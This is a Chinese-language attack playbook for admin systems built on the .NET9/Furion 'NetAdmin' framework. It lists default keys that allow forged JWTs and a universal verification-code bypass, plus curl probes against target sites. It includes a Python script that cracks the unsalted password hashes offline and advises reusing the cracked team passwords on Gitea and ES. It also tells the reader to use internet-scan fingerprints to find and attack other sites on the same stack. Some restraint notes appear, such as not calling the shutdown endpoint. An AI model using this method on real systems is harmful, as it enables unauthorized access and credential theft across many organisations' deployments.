# .NET9 + Furion NetAdmin 系管理框架：框架级万能验证码与默认密钥

> 定位：**厂商产品线通用缺陷**。这套框架（及 `YourSolution.AdmServer` 模板，.NET9 + Furion + Vue3）被多个站点复用，
> 默认值不换就是整条产品线的万能钥匙。
> **打同栈站点可直接复用；目标没沿用默认值就立刻收口写结论，别反复试。**

## 1. 识别指纹

- .NET：`Server: Kestrel`、`X-Powered-By`、错误页样式、统一 `{code,message,data}` 信封、`/api/` 前缀。
- 框架：Furion 注入风格、`AdmSettings.json`、`NetAdminSettings.json`、Swagger 分组名。
- 供应链：Harbor 镜像 `<product>:nightly`、Gitea 组织、GitHub org 的 `<Product>.AdmServer` 模板仓。

## 2. 默认值清单（拿到镜像/源码先搜这些）

```
GlobalStatic.SecretKey          = "{6C4922D3-

****-...}"     # 硬编码常量，产品线通用
AdmSettings.json  JWTSettings.IssuerSigningKey  = <默认 64 位>   # 可伪造 JWT
AdmSettings.json  Captcha.SecretKey             = <默认值>       # 可本地生成验证码
NetAdminSettings.json  Database / Redis / Minio 连接串(默认值)    # 直连内网服务
app/SeedData/Sys_User.json     默认账号 + 口令哈希
```

## 3. 硬编码主密钥能干什么

| 面 | 代码形态 | 后果 |
|---|---|---|
| **万能验证码** | `VerifyCodeService.VerifyAsync: if (req.Code == GlobalStatic.SecretKey) return true;` | 短信/图形/邮箱验证码一处通全通（注册、登录、改密、提现绑定） |
| **运维停机口** | `ProbeController: /probe/exit` `/probe/offline` `/probe/stop-log-counter?token=<SecretKey>` | 可让服务退出/离线（**只记录，绝不调用**） |
| 配置解密 | `ToolsService` 用同一密钥做 AES 解密 | 配置里的密文字段可解 |
| 调试后门 | `#if DEBUG: if (req.Code == "8888") return true;` | 仅 Debug 构建存在 → 反推"这套是不是开发直发版" |

无害探测（只读）：

```bash
# 探控制器是否存在（404 = 没这控制器或路由已改名）
curl -sk -o /dev/null -w '%{http_code}\n' "https://T/probe/exit"
# 只用一个只读业务接口验证万能码（例：某个 sendCode/verify 校验接口）
curl -sk -X POST "https://T/api/<module>/<sendCode|verify>" -H 'Content-Type: application/json' \
  -d '{"phone":"<自控号>","code":"<SecretKey>"}'
```

- **判死纪律**：目标未沿用默认值 ⇒ `/probe/*` 404、伪造 JWT 401 ⇒ 结论写
  **"厂商侧高危缺陷、该目标不适用"**，两条都写才可信，也不留多余足迹。
- 万能码只用于**取证**（证明校验可绕过），不去改口令/绑定资金账户（有痕、不可逆）。

## 4. 口令派生算法（把哈希变明文）

```
Pwd(pw) = HMAC-MD5(key = MD5_hex(pw), msg = pw)   → 32 位 hex
```

- 确定性、无盐 ⇒ 有算法 + 任意一个 hash 就能**离线字典反推**团队默认口令。
- 反推结果拿去登 Gitea / ES 等**只读面**验证（这类团队口令全服务复用）。**不改密码。**
```python
import hashlib, hmac
def pwd(pw): return hmac.new(hashlib.md5(pw.encode()).hexdigest().encode(), pw.encode(), hashlib.md5).hexdigest()
for w in open('dict.txt', encoding='utf-8').read().split():
    if pwd(w) == target_hash: print('HIT', w); break
```

## 5. 横向复用：一栈打全产品线

把默认值当"通行证"，用指纹找同栈其它站点：

- 端点指纹：`/probe/exit`、同款 `sendCode` / `verify` 路径、`AdmSettings.json` 可达、Swagger 分组名相同；
- 供应链指纹：同一 Harbor 项目 / 同一 Gitea 组织 / 同一 GitHub org（模板仓 README、issue、demo 域名里常写客户站）；
- 空间测绘语法：`body="probe/exit"` / `title="<产品名>"` / `cert="<厂商域>"`；
- 命中后**先验万能验证码（只读接口）**，不要直接动管理面。

## 6. 反模式

- 把"框架有硬编码密钥"直接写成"目标可接管" —— 必须**在该目标上实测**后才有结论。
- 调 `/probe/exit|offline` 去"验证" —— 这是可用性破坏，只记录不调用。
- 只试一个客户站失败就丢整条线 —— 正解是拿默认值去扫**同栈**目标。
